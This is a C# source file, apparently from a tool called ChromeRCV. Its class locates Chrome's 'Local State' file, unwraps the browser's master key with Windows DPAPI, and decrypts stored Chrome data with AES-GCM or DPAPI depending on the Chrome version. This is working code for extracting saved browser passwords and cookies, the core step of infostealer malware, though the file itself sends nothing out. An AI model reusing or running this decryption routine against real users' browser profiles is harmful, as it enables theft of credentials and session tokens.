using System;
using System.Linq;
using System.Text;
using System.IO;
using System.Security.Cryptography;

namespace ChromeRCV
{
    internal sealed class Crypt
    {
        public static byte[] GetMasterKey(string directory)
        {
            string filePath = directory + "\\Local State";
            if (File.Exists(filePath) == false)
                return null;

            string data = File.ReadAllText(filePath);
            byte[] masterKey = Convert.FromBase64String(SimpleJSON.JSON.Parse(data)["os_crypt"]["encrypted_key"]);

            byte[] temp = new byte[masterKey.Length - 5];
            Array.Copy(masterKey, 5, temp, 0, masterKey.Length - 5);

            try {
                return ProtectedData.Unprotect(temp, null, DataProtectionScope.CurrentUser);
            }
            catch (Exception ex) {
                Console.WriteLine(ex.ToString());
            }
            return null;
        }

        public static string DPAPIDecrypt(string encryptedData)
        {
            if (encryptedData.Length <= 0 || encryptedData == string.Empty)
                return string.Empty;

            string decryptedData = Encoding.UTF8.GetString(
                ProtectedData.Unprotect(
                    Encoding.Default.GetBytes(encryptedData), null, DataProtectionScope.CurrentUser
                )
            );
            return decryptedData;
        }

        public static string DecryptData(string data, byte[] key)
        {
            // chrome version >= 80
            if (data.StartsWith("v10") || data.StartsWith("v11"))
            {
                byte[] bytePass = Encoding.Default.GetBytes(data);
                byte[] iv = bytePass.Skip(3).Take(12).ToArray();
                byte[] encryptedData = bytePass.Skip(15).ToArray();

                return Encoding.UTF8.GetString(Sodium.SecretAeadAes.Decrypt(encryptedData, iv, key));
            }
            else {
                // chrome version < 80
                return DPAPIDecrypt(data);
            }
        }
    }
}
